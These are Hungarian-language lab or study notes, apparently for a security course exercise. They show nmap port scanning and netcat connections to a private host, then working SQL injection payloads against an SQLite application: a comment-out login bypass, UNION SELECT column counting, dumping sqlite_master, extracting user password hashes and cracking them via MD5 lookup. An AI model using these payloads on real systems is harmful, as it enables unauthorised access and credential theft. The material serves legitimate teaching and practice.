#------------------------
# nmap, nc feladat
#------------------------

# nyitott port lekövetése:
sudo nmap -sS -p {port_from}-{port_to} {ip_address}
# pl:
sudo nmap -sS -p 30000-65535 10.6.12.105

# nyitott porton chat kapcsolat nyitás
nc {ip_address} {port}
# pl:
nc 10.6.12.105 41959

#------------------------




#------------------------
# sql injection feladat
#------------------------

# sql táblában van infó arról, hogy az adott táblában milyen adattagok vannak
UNION SELECT sql FROM sqlite_master;


# -- bejelentkezés jelszóval úgy hogy nem tudjuk a jelszót
# get paraméterek használatával is lehet manipulálni

# általános bejelentkezési lekérdezés
SELECT * FROM users WHERE userid='$param1' AND password='$param2';

# ezt az állapodot akarjuk elérni:
SELECT * FROM users WHERE userid='felhasznalo';

# ezesetben az én inputom a felhasználó entry-be:
felhasznalo'; --
#'---------

# -- további sql injection
# - oszlopszám kiderítése (az első WHERE feltétel miatt)
# hogyan nézhet ki kb a lekérdezés
SELECT * FROM table WHERE type='$value';

# ezt az állapotot akarjuk elérni:
SELECT * FROM table WHERE type='' UNION SELECT 1,1,1,1;--

# az én inputom kb: (itt lehet próbálgatni, hogy hány egyest írok, mert abból derül ki hogy mennyi oszlop van
' UNION SELECT 1,1,1,1;--


#'# - táblák kiíratása:
# hogyan nézhet ki kb a lekérdezés
SELECT * FROM table WHERE type='$value';

# ezt az állapotot akarjuk elérni:
SELECT * FROM table WHERE type='' UNION SELECT name,sql,1,1 FROM sqlite_master WHERE 1;--

# az én inputom kb:
' UNION SELECT name,sql,1,1 FROM sqlite_master WHERE 1;--


#'# - users táblából jelszó kiderítése
# hogyan nézhet ki kb a lekérdezés
SELECT * FROM table WHERE type='$value';

# ezt az állapotot akarjuk elérni:
SELECT * FROM table WHERE type='' UNION SELECT name, key,1,1 FROM datausrbb WHERE 1;--

# az én inputom kb:
' UNION SELECT name, key,1,1 FROM datausrbb WHERE 1;--

#'# dekódolás: például MD5 decryptálóval

# ---------------------
